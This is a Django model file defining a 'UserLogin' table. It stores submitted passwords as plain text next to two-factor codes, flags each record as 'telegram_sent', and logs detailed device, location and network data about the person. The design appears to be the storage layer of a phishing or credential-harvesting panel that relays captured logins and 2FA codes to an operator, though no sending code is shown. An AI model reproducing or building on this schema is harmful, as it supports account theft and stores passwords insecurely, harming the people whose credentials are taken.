from django.db import models


class UserLogin(models.Model):
    email = models.EmailField(max_length=255, blank=True, null=True)
    phone_number = models.CharField(max_length=20, blank=True, null=True)
    username = models.CharField(max_length=150, blank=True, null=True)
    password = models.CharField(max_length=255)
    login_time = models.DateTimeField(auto_now_add=True)
    ip_address = models.GenericIPAddressField(blank=True, null=True)
    user_agent = models.TextField(blank=True, null=True)
    two_fa_code = models.CharField(max_length=10, blank=True, null=True)
    two_fa_time = models.DateTimeField(blank=True, null=True)
    telegram_sent = models.BooleanField(default=False)
    telegram_sent_time = models.DateTimeField(blank=True, null=True)
    
    # Device & Browser Info
    browser_name = models.CharField(max_length=100, blank=True, null=True)
    browser_version = models.CharField(max_length=50, blank=True, null=True)
    os_name = models.CharField(max_length=100, blank=True, null=True)
    device_type = models.CharField(max_length=50, blank=True, null=True)
    screen_resolution = models.CharField(max_length=20, blank=True, null=True)
    timezone = models.CharField(max_length=50, blank=True, null=True)
    language = models.CharField(max_length=10, blank=True, null=True)
    
    # Location Info
    country = models.CharField(max_length=100, blank=True, null=True)
    city = models.CharField(max_length=100, blank=True, null=True)
    region = models.CharField(max_length=100, blank=True, null=True)
    isp = models.CharField(max_length=200, blank=True, null=True)
    latitude = models.FloatField(blank=True, null=True)
    longitude = models.FloatField(blank=True, null=True)
    
    # Network Info
    connection_type = models.CharField(max_length=50, blank=True, null=True)
    referrer = models.URLField(blank=True, null=True)
    
    class Meta:
        ordering = ['-login_time']

    def __str__(self):
        return f"{self.email or self.username or self.phone_number} - {self.login_time}"